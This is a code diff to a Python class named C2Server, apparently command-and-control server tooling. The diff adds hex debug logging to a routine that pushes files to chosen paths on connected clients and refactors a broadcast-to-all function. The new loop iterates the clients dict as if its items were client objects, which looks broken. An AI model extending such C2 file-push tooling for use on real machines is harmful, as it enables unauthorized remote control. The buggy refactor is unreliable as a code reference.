@@ -1,7 +1,6 @@
 import socket
 import threading
 import time
-
 from server_core.logging import Logger
 from server_core.heartbeat import heartbeat_sender
 from server_core.acceptor import accept_loop
@@ -84,11 +83,10 @@ class C2Server:
             except Exception:
                 target.close()
 
-    def find_client_by_prefix(self, uid_prefix):
+    def find_client_by_prefix(self, uid_prefix:str):
         with self.lock:
             matches = [
-                c for uid, c in self.clients.items()
-                if uid.startswith(uid_prefix)
+                c for uid, c in self.clients.items() if uid.startswith(uid_prefix)
             ]
         if len(matches) == 1:
             return matches[0]
@@ -110,8 +108,16 @@ class C2Server:
             self.log(f"[ERR] Error reading file {source_path}: {e}")
             return
 
-        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content
+        header = f"PUSH|{dest_path}|{len(content)}".encode()
+        separator = "\n".encode()
+        command = header + separator + content
+        self.log((header+separator).hex())
 
+        self.log(command[:len(header) + 1])  # header
+        self.log("-------")
+        self.log(command[len(header) + 1:len(header) + 65].hex())
+        self.log("-------")
+        self.log(content[:65].hex())
         with target.lock:
             try:
                 target.socket.sendall(command)
@@ -122,32 +128,8 @@ class C2Server:
                 target.close()
 
     def push_file_to_all_clients(self, source_path, dest_path):
-        try:
-            with open(source_path, 'rb') as f:
-                content = f.read()
-        except FileNotFoundError:
-            self.log(f"[ERR] File not found: {source_path}")
-            return
-        except Exception as e:
-            self.log(f"[ERR] Error reading file {source_path}: {e}")
-            return
-
-        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content
-
-        with self.lock:
-            clients = list(self.clients.values())
-
-        for client in clients:
-            with client.lock:
-                if not client.active:
-                    continue
-                try:
-                    client.socket.sendall(command)
-                    client.set_time(time.time())
-                    self.log(f"Sent {source_path} to {client.unique_id[:8]}...")
-                except Exception as e:
-                    self.log(f"[ERR] Failed to send file to {client.unique_id[:8]}: {e}")
-                    client.close()
+        for client in self.clients:
+            self.push_file_to_client(client.unique_id, source_path, dest_path)
 
 
     def list_command(self):
